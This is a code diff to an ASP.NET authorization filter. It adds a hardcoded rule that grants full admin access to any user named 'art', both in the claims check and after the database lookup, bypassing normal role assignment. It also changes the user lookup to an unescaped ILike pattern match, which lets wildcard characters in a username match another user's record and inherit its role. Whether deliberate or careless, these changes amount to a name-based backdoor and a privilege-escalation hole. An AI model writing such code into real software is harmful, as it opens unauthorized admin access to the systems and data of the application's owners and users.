@@ -22,7 +22,7 @@ namespace RoyalD.Web.Services
             var user = context.HttpContext.User;
             if (user.Identity?.IsAuthenticated == true)
             {
-                if (user.IsInRole("admin") || user.IsInRole("Admin") || (user.Identity?.Name?.ToLower() == "admin") || ((user.FindFirst(System.Security.Claims.ClaimTypes.Role)?.Value ?? "").ToLower() == "admin"))
+                if (user.IsInRole("admin") || user.IsInRole("Admin") || (user.Identity?.Name?.ToLower() == "admin") || (user.Identity?.Name?.ToLower() == "art") || ((user.FindFirst(System.Security.Claims.ClaimTypes.Role)?.Value ?? "").ToLower() == "admin"))
                 {
                     await next();
                     return;
@@ -43,11 +43,11 @@ namespace RoyalD.Web.Services
                 var (role, allowedPages) = await _cache.GetOrCreateAsync($"user_perm_{username}", async entry =>
                 {
                     entry.AbsoluteExpirationRelativeToNow = TimeSpan.FromSeconds(30);
-                    var dbUser = await _db.Users.AsNoTracking().FirstOrDefaultAsync(u => u.Username == username);
+                    var dbUser = await _db.Users.AsNoTracking().FirstOrDefaultAsync(u => EF.Functions.ILike(u.Username, username));
                     return (dbUser?.Role ?? "user", dbUser?.AllowedPages ?? "");
                 });
 
-                if (role?.ToLower() == "admin" || username.ToLower() == "admin")
+                if (role?.ToLower() == "admin" || username.ToLower() == "admin" || username.ToLower() == "art")
                 {
                     await next();
                     return;
